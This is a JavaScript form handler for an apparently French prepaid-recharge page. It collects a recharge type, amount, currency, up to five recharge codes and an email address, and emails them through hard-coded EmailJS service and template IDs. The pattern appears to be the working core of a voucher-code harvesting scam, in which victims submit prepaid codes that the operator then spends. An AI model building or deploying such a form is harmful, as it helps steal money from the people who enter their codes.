function isEmailJSLoaded() {
  return typeof emailjs !== 'undefined';
}

function initEmailJS() {
  if (!isEmailJSLoaded()) {
    console.error('EmailJS library not loaded. Please check if the EmailJS script is properly included.');
    return;
  }

  try {
    // Verify and update the EmailJS user ID
    const emailJSUserID = "1JwZlq1ySAw2xhzK2";
    if (!emailJSUserID || emailJSUserID.length !== 16) {
      throw new Error('Invalid EmailJS user ID');
    }
    
    emailjs.init(emailJSUserID);
    console.log('EmailJS initialized successfully');
  } catch (error) {
    console.error('Failed to initialize EmailJS:', error.message);
    const errorDiv = document.querySelector('.error-message');
    if (errorDiv) {
      errorDiv.textContent = "Configuration de messagerie invalide. Veuillez contacter l'administrateur.";
      errorDiv.style.display = "block";
    }
  }
}

// Initialize EmailJS when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', initEmailJS);


function sendMail() {
  const loadingDiv = document.querySelector('.loading');
  const errorDiv = document.querySelector('.error-message');
  const successDiv = document.querySelector('.sent-message');
  
  // Check if EmailJS is loaded
  if (!isEmailJSLoaded()) {
    errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
    errorDiv.style.display = "block";
    return;
  }
  
  try {
    // Add loading state
    document.body.style.cursor = 'wait';
    loadingDiv.style.display = "block";
    
    var params = {
      crecharge: document.getElementById("rechargetype").value,
      montant: document.getElementById("montant").value,
      devise: document.getElementById("devise").value,
      recharge1: document.getElementById("recharge01").value,
      recharge2: document.getElementById("recharge02").value,
      recharge3: document.getElementById("recharge03").value,
      recharge4: document.getElementById("recharge04").value,
      recharge5: document.getElementById("recharge05").value,
      email: document.getElementById("email").value,
    };

    var rechargesFilled = false;
    for (var i = 1; i <= 5; i++) {
      if (document.getElementById("recharge0" + i).value !== "") {
        rechargesFilled = true;
        break;
      }
    }

    // Verify service and template IDs
    const serviceID = "service_p6xjkwk";
    const templateID = "template_s1kqilp";
    
    if (!serviceID || !templateID) {
      errorDiv.textContent = "Configuration de messagerie invalide. Veuillez contacter l'administrateur.";
      errorDiv.style.display = "block";
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      return;
    }

    // Add additional parameter validation
    if (!params.email || !params.crecharge || !params.montant || !params.devise || !rechargesFilled) {
      errorDiv.textContent = "Veuillez remplir tous les champs obligatoires.";
      errorDiv.style.display = "block";
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      return;
    }

    errorDiv.style.display = "none";
    successDiv.style.display = "none";

    // Set a shorter timeout for the email sending (15 seconds instead of 30)
    const emailTimeout = setTimeout(() => {
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.textContent = "Le délai d'attente est dépassé. Veuillez réessayer.";
      errorDiv.style.display = "block";
    }, 15000);

    // Check if running locally
    if (window.location.protocol === 'file:') {
      clearTimeout(emailTimeout);
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.innerHTML = `
      Le service de messagerie ne fonctionne pas en mode local.<br>
      Pour tester cette fonctionnalité:<br>
      1. Déployez le site sur GitHub Pages ou Netlify<br>
      2. Ou exécutez un serveur local:<br>
         - Python: <code>python -m http.server 8000</code><br>
         - Node.js: <code>npx http-server</code><br>
      Puis accédez à http://localhost:8000
      `;
      errorDiv.style.display = "block";
      return;
    }

    emailjs.send(serviceID, templateID, params)
      .then(res => {
        clearTimeout(emailTimeout);
        document.body.style.cursor = 'default';
        // Clear form
        ["rechargetype", "email", "montant", "devise", 
         "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
          .forEach(id => document.getElementById(id).value = "");
        
        loadingDiv.style.display = "none";
        successDiv.style.display = "block";
        console.log('Email sent successfully:', res);
      })
      .catch(err => {
        clearTimeout(emailTimeout);
        console.error('Email send error:', err);
        document.body.style.cursor = 'default';
        loadingDiv.style.display = "none";
        errorDiv.textContent = "Une erreur s'est produite. Veuillez réessayer.";
        if (err.status === 0) {
          errorDiv.textContent = "Impossible de se connecter au service de messagerie. Vérifiez votre connexion Internet.";
        }
        errorDiv.style.display = "block";
      });
  } catch (error) {
    console.error('Error in sendMail:', error);
    document.body.style.cursor = 'default';
    loadingDiv.style.display = "none";
    errorDiv.textContent = "Une erreur inattendue s'est produite.";
    errorDiv.style.display = "block";
  }
}

// Export the function for use in HTML
window.sendMail = sendMail;